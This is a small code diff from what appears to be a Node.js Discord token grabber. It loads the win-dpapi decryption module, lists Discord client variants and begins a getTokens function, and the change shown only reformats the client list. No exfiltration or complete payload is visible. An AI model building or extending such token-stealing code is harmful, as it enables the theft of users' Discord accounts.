@@ -3,7 +3,14 @@ const fs = require("fs"),
     path = require("path"),
     aurita = require("win-dpapi");
 
-const cords = ["discord", "discordDevelopment", "discordcanary", "discordptb", "lightcord"];
+const cords = [
+    "discord", 
+    "discordDevelopment", 
+    "discordcanary", 
+    "discordptb", 
+    "lightcord"
+];
+
 const tokens = [];
 
 async function getTokens(p) {
